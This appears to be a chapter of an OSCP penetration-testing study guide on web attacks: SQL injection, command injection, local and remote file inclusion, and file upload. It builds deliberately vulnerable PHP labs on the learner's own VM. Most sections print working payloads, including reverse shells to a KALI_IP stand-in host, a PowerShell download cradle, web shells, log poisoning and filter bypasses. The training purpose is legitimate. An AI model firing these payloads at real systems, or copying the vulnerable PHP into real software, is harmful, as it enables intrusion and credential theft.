# 05 — Web Application Attacks

Web applications are the most common initial access vector on the OSCP exam. At least one (usually two) of your standalone machines will have a web-based foothold. This section covers every web attack type you need to know, with full explanations of how each one works, why it works, and how to practice it.

---

## Before You Attack: Web Enumeration Refresher

Before attacking a web app, you need to know what's there. This should already be done from your enumeration phase, but as a quick reference:

```bash
# What's the server?
curl -I http://TARGET
whatweb http://TARGET

# View the page source — ALWAYS do this
curl -s http://TARGET | grep -i "<!--\|password\|admin\|user\|key\|secret\|config\|debug\|todo\|hack\|flag"

# Directory brute force
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,old,conf -o dirs.txt

# Check for common files
curl http://TARGET/robots.txt
curl http://TARGET/sitemap.xml
curl http://TARGET/.htaccess
curl http://TARGET/wp-config.php.bak
curl http://TARGET/web.config
curl http://TARGET/.git/HEAD
```

**Key point for the exam:** When you're stuck, re-enumerate the web server with a bigger wordlist or different extensions. The answer is almost always something you missed during enumeration.

---

## SQL Injection (SQLi)

### What it actually is

SQL injection happens when a web application takes user input and plugs it directly into a SQL database query without sanitizing it first. You're not "hacking the database" directly — you're manipulating the application's own query by injecting SQL code through input fields the developer didn't protect.

### How a normal login works

When you type a username and password into a login form, the application builds a SQL query:

```php
// The vulnerable PHP code on the server
$query = "SELECT * FROM users WHERE username='" . $_POST['user'] . "' AND password='" . $_POST['pass'] . "'";
```

When you type `admin` and `password123`, it becomes:

```sql
SELECT * FROM users WHERE username='admin' AND password='password123'
```

The database checks: "Is there a user named admin with password password123?" If yes, you're logged in. If no, you're rejected.

### How the injection works

Instead of typing a normal username, you type: `' OR 1=1--`

The query becomes:

```sql
SELECT * FROM users WHERE username='' OR 1=1--' AND password=''
```

Let's break down what changed:

```
' OR 1=1--

'        → closes the opening quote from the original query
OR 1=1   → adds a condition that's ALWAYS true
--       → comments out everything after this point (the password check)
```

So the database now runs: "Find users where username is empty OR 1 equals 1." Since 1 always equals 1, this returns EVERY user in the database. The password check is completely bypassed because `--` commented it out. The application sees "query returned results" and logs you in — usually as the first user in the database (often admin).

### Testing for SQLi — the methodology

When you find an input field (login form, search box, URL parameter), test it systematically:

**Step 1: Send a single quote to see if it breaks the query**

```
Input: '
```

If you get a SQL error like `You have an error in your SQL syntax` or the page behaves differently (blank page, 500 error, different content), the input is likely going directly into a SQL query.

**Step 2: Try basic authentication bypass payloads**

Try each of these in the username field, with anything in the password field:

```
' OR 1=1--
' OR 1=1#
' OR '1'='1
admin'--
" OR 1=1--
') OR 1=1--
' OR 1=1-- -
```

Why so many variations? Different databases use different comment syntax (`--` for MSSQL/PostgreSQL/Oracle, `#` for MySQL), and the query might use single quotes, double quotes, or have parentheses you need to close.

**Step 3: Test URL parameters**

```
http://TARGET/page.php?id=1
http://TARGET/page.php?id=1'
http://TARGET/page.php?id=1 AND 1=1
http://TARGET/page.php?id=1 AND 1=2
```

If `id=1 AND 1=1` shows the normal page but `id=1 AND 1=2` shows a different page or is blank, the parameter is injectable. You're asking the database a true/false question and getting different responses.

### UNION-based SQLi — extracting data step by step

Once you've confirmed SQLi exists, UNION injection is how you pull data out of the database. This is the most important SQLi technique for the OSCP.

**How UNION works:** The `UNION` operator combines results from two queries. Your injected query runs alongside the original one, and its results appear on the page.

**Requirement:** The number of columns in your UNION query must EXACTLY match the number of columns in the original query.

#### Step 1: Find the column count

```
http://TARGET/page.php?id=1 ORDER BY 1--       Works (1 or more columns)
http://TARGET/page.php?id=1 ORDER BY 2--       Works (2 or more columns)
http://TARGET/page.php?id=1 ORDER BY 3--       Works (3 or more columns)
http://TARGET/page.php?id=1 ORDER BY 4--       ERROR! (only 3 columns)
```

The last number that works without an error is your column count. Here it's 3.

#### Step 2: Find which columns are displayed on the page

```
http://TARGET/page.php?id=-1 UNION SELECT 1,2,3--
```

Note the `id=-1` — using a value that doesn't exist ensures the original query returns nothing, so only your UNION results show. Look at the page — you'll see some of the numbers (1, 2, or 3) displayed somewhere in the HTML. Those are the columns you can extract data through.

Let's say you see `2` and `3` on the page. Those are your injectable columns.

#### Step 3: Extract database information

Replace the visible column numbers with SQL functions:

```
-- What database software is running?
http://TARGET/page.php?id=-1 UNION SELECT 1,@@version,3--
-- Shows: 10.5.12-MariaDB (or 5.7.38-MySQL, etc.)

-- What's the current database name?
http://TARGET/page.php?id=-1 UNION SELECT 1,database(),3--
-- Shows: webapp_db

-- What user is the database running as?
http://TARGET/page.php?id=-1 UNION SELECT 1,user(),3--
-- Shows: root@localhost (if root, you might be able to read/write files)
```

#### Step 4: List all databases

```
http://TARGET/page.php?id=-1 UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--
```

`information_schema` is a built-in database that contains metadata about all other databases. `GROUP_CONCAT` puts multiple results into one comma-separated string so they all display in one field.

Example output: `information_schema,mysql,webapp_db,secret_db`

#### Step 5: List tables in the target database

```
http://TARGET/page.php?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='webapp_db'--
```

Example output: `users,products,orders,logs`

`users` is what you want.

#### Step 6: List columns in the users table

```
http://TARGET/page.php?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--
```

Example output: `id,username,password,email,role`

#### Step 7: Extract the data

```
http://TARGET/page.php?id=-1 UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR '<br>'),3 FROM users--
```

Example output:
```
admin:$2y$10$LhK5G...   (bcrypt hash)
john:Password123!         (plaintext — bad developer)
sarah:5f4dcc3b5aa7...     (MD5 hash)
```

Now you have credentials. Crack the hashes with hashcat/john, or if any are plaintext, try them on SSH, admin panels, etc.

### Blind SQLi — when you can't see output

Sometimes the page doesn't display query results directly. The page just shows the same content or different content based on whether the query returned results. This is blind injection.

#### Boolean-based blind

The page behaves differently for true vs false conditions:

```
http://TARGET/page.php?id=1 AND 1=1--     Normal page (condition is true)
http://TARGET/page.php?id=1 AND 1=2--     Different/blank page (condition is false)
```

You extract data by asking yes/no questions one character at a time:

```
-- Is the first character of the database name > 'm'?
http://TARGET/page.php?id=1 AND (SELECT SUBSTRING(database(),1,1)) > 'm'--

-- If normal page → yes, first char is after 'm' in the alphabet
-- If blank page → no, first char is 'm' or before

-- Is it 'w'?
http://TARGET/page.php?id=1 AND (SELECT SUBSTRING(database(),1,1)) = 'w'--
-- Normal page → yes! First character is 'w'

-- Move to second character
http://TARGET/page.php?id=1 AND (SELECT SUBSTRING(database(),2,1)) = 'e'--
```

This is extremely tedious manually. For the OSCP, know how to confirm blind SQLi exists and understand the concept, but use a script or manual UNION injection when possible.

#### Time-based blind

The page looks the same regardless of true/false. But you can inject `SLEEP()`:

```
http://TARGET/page.php?id=1 AND SLEEP(5)--
```

If the page takes 5 seconds to load, the injection worked. If it loads normally, it didn't.

```
-- Is the first character of the admin password > 'm'?
http://TARGET/page.php?id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)>'m', SLEEP(5), 0)--

-- If page takes 5 seconds → yes
-- If page loads instantly → no
```

### SQLi for code execution — getting a shell from a database

This is where SQLi becomes a full compromise, not just data theft.

#### MySQL — reading files from the server

If the database user has FILE privilege (often true for root):

```
http://TARGET/page.php?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
```

This reads `/etc/passwd` from the server and displays it on the web page. You can read any file the database process has permission to access.

**Useful files to read:**

```
/etc/passwd                    — user accounts
/etc/shadow                    — password hashes (often blocked)
/home/user/.ssh/id_rsa         — SSH private keys
/var/www/html/config.php       — database credentials
/var/www/html/wp-config.php    — WordPress database credentials
/etc/apache2/sites-enabled/*   — virtual host configs (find other web apps)
```

#### MySQL — writing a web shell

If the database user has FILE privilege and you know the web root path:

```
http://TARGET/page.php?id=-1 UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--
```

This writes a PHP web shell to the web root. Now:

```bash
curl "http://TARGET/shell.php?cmd=whoami"
# www-data

curl "http://TARGET/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data)
```

Then escalate to a full reverse shell:

```bash
curl "http://TARGET/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/4444%200>%261'"
```

#### MSSQL — xp_cmdshell (direct command execution)

MSSQL (Microsoft SQL Server) has a built-in stored procedure for running OS commands:

```
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--
```

First two lines enable xp_cmdshell (disabled by default). Third line runs `whoami` on the server.

Get a reverse shell:

```
'; EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(''http://KALI_IP/shell.ps1'')"';--
```

### SQLi database differences

| Feature | MySQL | MSSQL | PostgreSQL |
|---|---|---|---|
| Comment syntax | `-- ` or `#` | `-- ` | `-- ` |
| String concat | `CONCAT(a,b)` | `a+b` | `a\|\|b` |
| Version | `@@version` | `@@version` | `version()` |
| Current DB | `database()` | `db_name()` | `current_database()` |
| List DBs | `information_schema.schemata` | `master..sysdatabases` | `pg_database` |
| Read files | `LOAD_FILE('/path')` | `OPENROWSET` (complex) | `pg_read_file('/path')` |
| Write files | `INTO OUTFILE` | `xp_cmdshell` | `COPY TO` |
| Command exec | Not built-in | `xp_cmdshell` | `COPY TO PROGRAM` |

### Lab: Practice SQLi on your Debian VM

```bash
# On Debian — install MySQL and create a vulnerable app
sudo apt install apache2 php libapache2-mod-php php-mysql mariadb-server -y

sudo systemctl start mariadb

# Create the database and table
sudo mysql -e "CREATE DATABASE testdb;"
sudo mysql -e "CREATE TABLE testdb.users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(50), password VARCHAR(100), email VARCHAR(100));"
sudo mysql -e "INSERT INTO testdb.users (username, password, email) VALUES ('admin', 'SuperSecret123', 'admin@company.com');"
sudo mysql -e "INSERT INTO testdb.users (username, password, email) VALUES ('john', 'Password1!', 'john@company.com');"
sudo mysql -e "INSERT INTO testdb.users (username, password, email) VALUES ('flag_user', 'FLAG{sqli_data_extracted}', 'flag@company.com');"
sudo mysql -e "GRANT ALL ON testdb.* TO 'webuser'@'localhost' IDENTIFIED BY 'webpass';"
sudo mysql -e "FLUSH PRIVILEGES;"

# Create the vulnerable search page
cat << 'PHPEOF' | sudo tee /var/www/html/search.php
<?php
$conn = new mysqli("localhost", "webuser", "webpass", "testdb");
if(isset($_GET['id'])) {
    $id = $_GET['id'];
    $result = $conn->query("SELECT * FROM users WHERE id=$id");
    if($result && $row = $result->fetch_assoc()) {
        echo "<h2>User Found</h2>";
        echo "<p>Username: " . $row['username'] . "</p>";
        echo "<p>Email: " . $row['email'] . "</p>";
    } else {
        echo "<p>No user found.</p>";
    }
}
?>
<h1>User Search</h1>
<form method="GET">
<label>User ID:</label>
<input type="text" name="id">
<button type="submit">Search</button>
</form>
PHPEOF

# Create a vulnerable login page
cat << 'PHPEOF' | sudo tee /var/www/html/login.php
<?php
$conn = new mysqli("localhost", "webuser", "webpass", "testdb");
if(isset($_POST['user']) && isset($_POST['pass'])) {
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $result = $conn->query("SELECT * FROM users WHERE username='$user' AND password='$pass'");
    if($result && $result->num_rows > 0) {
        $row = $result->fetch_assoc();
        echo "<h2>Welcome, " . $row['username'] . "!</h2>";
        echo "<p>Your email: " . $row['email'] . "</p>";
    } else {
        echo "<p>Invalid credentials.</p>";
    }
}
?>
<h1>Login</h1>
<form method="POST">
<label>Username:</label><input type="text" name="user"><br>
<label>Password:</label><input type="password" name="pass"><br>
<button type="submit">Login</button>
</form>
PHPEOF

sudo systemctl restart apache2
```

**Now practice from Kali:**

```bash
# Test the search page for SQLi
curl "http://DEBIAN_IP/search.php?id=1"          # Normal — shows admin
curl "http://DEBIAN_IP/search.php?id=1'"          # Error — SQLi confirmed
curl "http://DEBIAN_IP/search.php?id=1 OR 1=1"   # Shows first user

# Find column count
curl "http://DEBIAN_IP/search.php?id=1 ORDER BY 1"   # Works
curl "http://DEBIAN_IP/search.php?id=1 ORDER BY 2"   # Works
curl "http://DEBIAN_IP/search.php?id=1 ORDER BY 3"   # Works
curl "http://DEBIAN_IP/search.php?id=1 ORDER BY 4"   # Works
curl "http://DEBIAN_IP/search.php?id=1 ORDER BY 5"   # Error — 4 columns

# UNION injection — find visible columns
curl "http://DEBIAN_IP/search.php?id=-1 UNION SELECT 1,2,3,4"

# Extract data
curl "http://DEBIAN_IP/search.php?id=-1 UNION SELECT 1,@@version,database(),4"
curl "http://DEBIAN_IP/search.php?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema='testdb'"
curl "http://DEBIAN_IP/search.php?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'"
curl "http://DEBIAN_IP/search.php?id=-1 UNION SELECT 1,GROUP_CONCAT(username,':',password),3,4 FROM users"
# You should see all usernames and passwords including the flag

# Test the login page
curl -X POST "http://DEBIAN_IP/login.php" -d "user=admin&pass=test"               # Fails
curl -X POST "http://DEBIAN_IP/login.php" -d "user=' OR 1=1--&pass=anything"      # Bypassed!
curl -X POST "http://DEBIAN_IP/login.php" -d "user=admin'--&pass=anything"         # Logs in as admin
```

---

## Command Injection

### What it actually is

Command injection happens when a web application passes user input to an operating system command. If the developer doesn't sanitize the input, you can chain additional commands onto the legitimate one.

### How it works — the full picture

Here's a typical vulnerable PHP application:

```php
<?php
$ip = $_GET['ip'];
system("ping -c 2 " . $ip);
?>
```

**Normal use:** User enters `192.168.1.1`
The server runs: `ping -c 2 192.168.1.1`
Output: normal ping results

**Attack:** User enters `192.168.1.1; whoami`
The server runs: `ping -c 2 192.168.1.1; whoami`
Output: ping results PLUS `www-data` (the web server user)

The semicolon (`;`) tells the shell "run the first command, then run the second command." The server has no idea — it just passes the whole string to the shell.

### All the ways to chain commands

Different characters chain commands differently. Try all of them because the application might filter some but not others:

```
# Semicolon — run sequentially regardless of success/failure
127.0.0.1; whoami

# Pipe — feed first command's output to second
127.0.0.1 | whoami

# Double ampersand — run second only if first SUCCEEDS
127.0.0.1 && whoami

# Double pipe — run second only if first FAILS
|| whoami

# Ampersand — run first in background, run second immediately
127.0.0.1 & whoami

# Backticks — execute inline and substitute the result
`whoami`

# Dollar parentheses — same as backticks
$(whoami)

# Newline (URL encoded) — treated as a new command
127.0.0.1%0awhoami
```

### From command injection to a full reverse shell

Command injection gives you one command at a time through a web request. You want an interactive shell. Here's the escalation path:

**Step 1: Confirm injection works**

```bash
curl "http://TARGET/ping.php?ip=127.0.0.1;whoami"
# Look for "www-data" in the output
```

**Step 2: Enumerate from the injection**

```bash
# What user?
curl "http://TARGET/ping.php?ip=127.0.0.1;id"

# What OS?
curl "http://TARGET/ping.php?ip=127.0.0.1;uname%20-a"

# Is python available? (needed for shell upgrade)
curl "http://TARGET/ping.php?ip=127.0.0.1;which%20python3"

# Is netcat available?
curl "http://TARGET/ping.php?ip=127.0.0.1;which%20nc"

# Can we see other users?
curl "http://TARGET/ping.php?ip=127.0.0.1;cat%20/etc/passwd"
```

Note: `%20` is a URL-encoded space. You can't use literal spaces in URL parameters.

**Step 3: Get a reverse shell**

On Kali, start a listener:
```bash
nc -lvnp 4444
```

Inject the reverse shell command:
```bash
# Method 1: Direct bash reverse shell (URL encoded)
curl "http://TARGET/ping.php?ip=127.0.0.1;bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/4444%200>%261'"

# Method 2: Base64 encode to avoid special character issues
# First, create the payload
echo "bash -i >& /dev/tcp/KALI_IP/4444 0>&1" | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC9LQUxJX0lQLzQ0NDQgMD4mMQ==

# Then inject the encoded version
curl "http://TARGET/ping.php?ip=127.0.0.1;echo%20YmFzaCAtaSA+JiAvZGV2L3RjcC9LQUxJX0lQLzQ0NDQgMD4mMQ==%20|%20base64%20-d%20|%20bash"

# Method 3: Use netcat if available on target
curl "http://TARGET/ping.php?ip=127.0.0.1;nc%20-e%20/bin/bash%20KALI_IP%204444"

# Method 4: Named pipe (works when nc doesn't have -e)
curl "http://TARGET/ping.php?ip=127.0.0.1;rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/bash%20-i%202>%261|nc%20KALI_IP%204444%20>/tmp/f"
```

### Common filters and how to bypass them

Developers sometimes try to filter dangerous characters but do it poorly:

```bash
# If spaces are filtered, use ${IFS} (Internal Field Separator)
;cat${IFS}/etc/passwd

# Or use tabs (%09 URL encoded)
;cat%09/etc/passwd

# If semicolons are filtered, use newlines
%0awhoami

# If "cat" is filtered, use alternatives
;head /etc/passwd
;tail /etc/passwd
;less /etc/passwd
;more /etc/passwd
;tac /etc/passwd           # cat backwards
;rev /etc/passwd | rev     # double reverse

# If common commands are blacklisted
;w'h'oami                  # quotes break up the word
;wh$()oami                 # empty variable breaks up the word
;/bin/wh?ami               # wildcard
```

### Lab: Practice command injection on your Debian VM

```bash
# On Debian — create a vulnerable ping tool
cat << 'PHPEOF' | sudo tee /var/www/html/ping.php
<h1>Network Diagnostic Tool</h1>
<form method="GET">
  <label>Enter IP to ping:</label>
  <input type="text" name="ip" size="40">
  <button type="submit">Ping</button>
</form>
<?php
if(isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    echo "<h2>Results:</h2>";
    echo "<pre>";
    system("ping -c 2 " . $ip);
    echo "</pre>";
}
?>
PHPEOF

sudo systemctl restart apache2
```

**Practice from Kali:**

```bash
# Test normal functionality
curl "http://DEBIAN_IP/ping.php?ip=127.0.0.1"

# Test command injection with each operator
curl "http://DEBIAN_IP/ping.php?ip=127.0.0.1;whoami"
curl "http://DEBIAN_IP/ping.php?ip=127.0.0.1|whoami"
curl "http://DEBIAN_IP/ping.php?ip=127.0.0.1%26%26whoami"   # && URL encoded

# Enumerate through injection
curl "http://DEBIAN_IP/ping.php?ip=127.0.0.1;id"
curl "http://DEBIAN_IP/ping.php?ip=127.0.0.1;cat%20/etc/passwd"
curl "http://DEBIAN_IP/ping.php?ip=127.0.0.1;ls%20-la%20/home"
curl "http://DEBIAN_IP/ping.php?ip=127.0.0.1;ss%20-tlnp"

# Get a reverse shell
# On Kali terminal 1: nc -lvnp 4444
# On Kali terminal 2:
curl "http://DEBIAN_IP/ping.php?ip=127.0.0.1;bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/4444%200>%261'"
```

---

## Local File Inclusion (LFI)

### What it actually is

LFI happens when a web application uses user input to decide which file to load and display. If the developer doesn't restrict what files can be included, you can make the application load files from anywhere on the server — configuration files, password files, SSH keys, source code.

### How it works — the full picture

Here's the vulnerable code:

```php
<?php
// Developer intends for this to load pages like about.php, contact.php
$page = $_GET['page'];
include($page);
?>
```

**Normal use:** `http://TARGET/index.php?page=about.php`
Server loads: `/var/www/html/about.php` — the about page displays normally.

**Attack:** `http://TARGET/index.php?page=../../../../etc/passwd`
Server loads: `/etc/passwd` — the system's user list displays on the web page.

The `../` sequences traverse up the directory tree. Four levels of `../` gets you from `/var/www/html/` to `/` (root), and then you specify the file you want.

### Why `../` works

```
/var/www/html/about.php         ← normal file
/var/www/html/../../../../etc/passwd
         │
         └── ../../../.. = go up 4 directories
             /var/www/html → /var/www → /var → / → /etc/passwd
```

You don't need to know exactly how deep you are — using more `../` than necessary still works because going above `/` just stays at `/`:

```
/var/www/html/../../../../../../../etc/passwd
                                    │
                   still resolves to /etc/passwd
```

### Common LFI path traversals

```
# Basic traversal
../../../../etc/passwd
../../../etc/passwd
../../../../../../etc/passwd

# Null byte (works on PHP < 5.3.4 — old but still shows up)
../../../../etc/passwd%00

# Double URL encoding (bypasses some filters)
..%252f..%252f..%252f..%252fetc/passwd

# Using ../ with different slashes (Windows)
..\..\..\..\windows\win.ini
....//....//....//....//etc/passwd
```

### Important files to read via LFI

**Linux:**
```
/etc/passwd                          — user accounts (always try first — confirms LFI works)
/etc/shadow                          — password hashes (usually not readable by www-data)
/etc/hosts                           — local DNS entries
/etc/hostname                        — machine name
/home/USER/.ssh/id_rsa               — SSH private keys (try every user from /etc/passwd)
/home/USER/.ssh/authorized_keys      — see who can SSH in
/home/USER/.bash_history             — command history (credentials, paths)
/var/www/html/config.php             — database credentials
/var/www/html/wp-config.php          — WordPress database credentials
/var/log/apache2/access.log          — web server log (needed for log poisoning)
/var/log/auth.log                    — authentication log
/proc/self/environ                   — environment variables (sometimes has secrets)
/proc/self/cmdline                   — how the current process was started
/etc/apache2/sites-enabled/000-default.conf  — virtual host config (find other web roots)
/etc/crontab                         — scheduled tasks
/opt/config/*                        — application configs often left in /opt
```

**Windows:**
```
C:\Windows\win.ini                              — confirms LFI works
C:\Windows\System32\drivers\etc\hosts           — local DNS
C:\inetpub\wwwroot\web.config                   — IIS config (credentials)
C:\Users\USER\Desktop\local.txt                 — OSCP flag location
C:\xampp\apache\conf\httpd.conf                 — XAMPP config
C:\xampp\passwords.txt                          — XAMPP default creds
```

### LFI to Remote Code Execution (RCE)

LFI alone only reads files — it doesn't execute code. But there are ways to escalate LFI to full command execution:

#### Method 1: Log poisoning (Apache log)

The idea: inject PHP code into a file you know exists (like a log file), then include that file via LFI. The PHP code gets executed when included.

**Step 1: Poison the Apache access log by sending a request with PHP in the User-Agent header:**

```bash
curl "http://TARGET/" -A "<?php system(\$_GET['cmd']); ?>"
```

Apache logs the User-Agent to `/var/log/apache2/access.log`. The log now contains your PHP code.

**Step 2: Include the log file via LFI with a command:**

```
http://TARGET/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami
```

When the server includes the log file, it encounters your PHP code and executes it. The `cmd=whoami` parameter is passed to `system()`.

**Step 3: Get a reverse shell through the poisoned log:**

```bash
# On Kali: nc -lvnp 4444
curl "http://TARGET/index.php?page=../../../../var/log/apache2/access.log&cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/4444%200>%261'"
```

#### Method 2: PHP wrappers

PHP has built-in stream wrappers that can be used with `include()`:

```
# php://filter — read source code as base64 (doesn't execute it)
http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=config
# Decode: echo "BASE64OUTPUT" | base64 -d

# php://input — execute PHP from the request body (requires allow_url_include=On)
curl http://TARGET/index.php?page=php://input -d "<?php system('whoami'); ?>"

# data:// wrapper — embed code directly (requires allow_url_include=On)
http://TARGET/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami
# The base64 decodes to: <?php system($_GET['cmd']); ?>
```

### When LFI has a forced extension

Sometimes the code adds `.php` to whatever you provide:

```php
include($_GET['page'] . '.php');
```

So `page=config` loads `config.php`. Your traversal `page=../../../../etc/passwd` becomes `../../../../etc/passwd.php` which doesn't exist.

**Bypasses:**
```
# Null byte (PHP < 5.3.4)
../../../../etc/passwd%00

# Long path truncation (PHP < 5.3 on Windows)
../../../../etc/passwd[AAAA...repeat to 4096 chars]

# PHP wrappers don't care about extensions
php://filter/convert.base64-encode/resource=config
```

### Lab: Practice LFI on your Debian VM

```bash
# On Debian — create LFI vulnerable pages
cat << 'PHPEOF' | sudo tee /var/www/html/page.php
<?php
if(isset($_GET['file'])) {
    include($_GET['file']);
} else {
    echo "<p>Use ?file=about.php to load a page</p>";
}
?>
<h1>Page Viewer</h1>
<a href="?file=about.php">About</a> |
<a href="?file=contact.php">Contact</a>
PHPEOF

echo "<h1>About Us</h1><p>We are a company.</p>" | sudo tee /var/www/html/about.php
echo "<h1>Contact</h1><p>Email: admin@company.com</p>" | sudo tee /var/www/html/contact.php

# Create a config file with credentials (something to find via LFI)
cat << 'EOF' | sudo tee /var/www/html/config.php
<?php
$db_host = "localhost";
$db_user = "root";
$db_pass = "DatabaseP@ss!";
$db_name = "production";
$secret_key = "FLAG{lfi_config_leak}";
?>
EOF

sudo systemctl restart apache2
```

**Practice from Kali:**

```bash
# Normal usage
curl "http://DEBIAN_IP/page.php?file=about.php"

# Test LFI
curl "http://DEBIAN_IP/page.php?file=../../../../etc/passwd"

# Read SSH keys (if any user has them)
curl "http://DEBIAN_IP/page.php?file=../../../../home/platinum/.ssh/id_rsa"

# Read the config file as base64 (to see PHP source, not execute it)
curl "http://DEBIAN_IP/page.php?file=php://filter/convert.base64-encode/resource=config"
echo "BASE64_OUTPUT_HERE" | base64 -d
# Reveals database password and flag

# Log poisoning attack
# Step 1: Poison the log
curl "http://DEBIAN_IP/" -A "<?php system(\$_GET['cmd']); ?>"

# Step 2: Execute through LFI
curl "http://DEBIAN_IP/page.php?file=../../../../var/log/apache2/access.log&cmd=whoami"
```

---

## File Upload Vulnerabilities

### What it actually is

When a web application allows file uploads (profile pictures, documents, attachments), it might not properly validate what you upload. If you can upload a file with executable code (like a PHP web shell) and the server stores it in a web-accessible location, you can execute that code by navigating to it.

### The attack — step by step

**Step 1: Create a web shell**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Step 2: Upload it through the application's upload form**

Use the browser or curl. The application saves it somewhere like `/var/www/html/uploads/shell.php`.

**Step 3: Access the shell**

```bash
curl "http://TARGET/uploads/shell.php?cmd=whoami"
# www-data
```

**Step 4: Escalate to a reverse shell**

```bash
# On Kali: nc -lvnp 4444
curl "http://TARGET/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/4444%200>%261'"
```

### Bypassing upload filters

Applications try to block dangerous uploads, but the filters can often be bypassed:

#### Extension filters

The application blocks `.php`. Try:

```
shell.php5          PHP5 extension — Apache often processes these
shell.phtml         Alternative PHP extension
shell.phar          PHP archive — still executed as PHP
shell.phps          PHP source — sometimes executed
shell.php.jpg       Double extension — some servers only check the last one
shell.PHP           Case variation — filters checking for lowercase miss this
shell.pHp           Mixed case
.htaccess           Upload Apache config to make .jpg execute as PHP:
                    Content: AddType application/x-httpd-php .jpg
                    Then upload shell.jpg — Apache runs it as PHP
```

#### Content-type filters

The application checks the `Content-Type` header, not the actual file. Intercept the request with Burp Suite and change:

```
Content-Type: application/x-php    →    Content-Type: image/jpeg
```

The server thinks it's a JPEG because the header says so, but the file is actually PHP.

#### Magic bytes / file signature

Some applications check the first few bytes of the file (the "magic number") to identify the file type. Add image magic bytes before your PHP code:

```bash
# Create a PHP shell that looks like a GIF
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif

# Create one that looks like a JPEG (hex bytes)
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# Create one that looks like a PNG
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php.png
```

The file starts with valid image bytes, so file-type checks pass. But when Apache processes it as PHP (because of the `.php` in the name), the PHP code executes.

### Finding the upload location

After uploading, you need to know WHERE the file was saved. Check:

```bash
# Common upload directories
http://TARGET/uploads/
http://TARGET/upload/
http://TARGET/files/
http://TARGET/images/
http://TARGET/media/
http://TARGET/attachments/
http://TARGET/tmp/

# The page source might reveal the path
# After uploading, view the page source — the image/file link shows the path
# <img src="/uploads/filename.jpg">

# Directory brute force
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
```

### Lab: Practice file upload on your Debian VM

```bash
# On Debian — create a file upload page
sudo mkdir -p /var/www/html/uploads
sudo chmod 777 /var/www/html/uploads

cat << 'PHPEOF' | sudo tee /var/www/html/upload.php
<h1>File Upload</h1>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <button type="submit">Upload</button>
</form>
<?php
if(isset($_FILES['file'])) {
    $target = "/var/www/html/uploads/" . basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "<p>File uploaded to: <a href='/uploads/" . basename($_FILES['file']['name']) . "'>/uploads/" . basename($_FILES['file']['name']) . "</a></p>";
    } else {
        echo "<p>Upload failed.</p>";
    }
}
?>
PHPEOF

sudo systemctl restart apache2
```

**Practice from Kali:**

```bash
# Create a web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload it
curl -F "file=@shell.php" http://DEBIAN_IP/upload.php

# Access it
curl "http://DEBIAN_IP/uploads/shell.php?cmd=whoami"
curl "http://DEBIAN_IP/uploads/shell.php?cmd=id"
curl "http://DEBIAN_IP/uploads/shell.php?cmd=cat%20/etc/passwd"

# Get a reverse shell
# Terminal 1: nc -lvnp 4444
# Terminal 2:
curl "http://DEBIAN_IP/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/4444%200>%261'"
```

---

## Remote File Inclusion (RFI)

### What it is

Same as LFI, but instead of including a file from the server, you include a file from YOUR server. The target server downloads and executes your malicious file.

```
http://TARGET/index.php?page=http://KALI_IP/shell.php
```

### When it works

RFI requires `allow_url_include = On` in PHP's configuration. This is OFF by default on modern PHP, so RFI is less common than LFI. But when you find it, it's an easy shell.

### The attack

```bash
# On Kali — create a shell and serve it
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80

# Trigger the inclusion
curl "http://TARGET/index.php?page=http://KALI_IP/shell.php&cmd=whoami"
```

The target server fetches `http://KALI_IP/shell.php` from your server, includes it, and executes the PHP code. You'll see the request in your Python HTTP server output.

### Testing for RFI

If you've confirmed LFI exists, test RFI by including a file from your Kali:

```bash
# Start a listener to see if the target reaches out
python3 -m http.server 80

# Try the inclusion
curl "http://TARGET/index.php?page=http://KALI_IP/test"
```

Check your Python server — if you see an incoming request from the target's IP, RFI works.

---

## Cross-Site Scripting (XSS)

### What it is

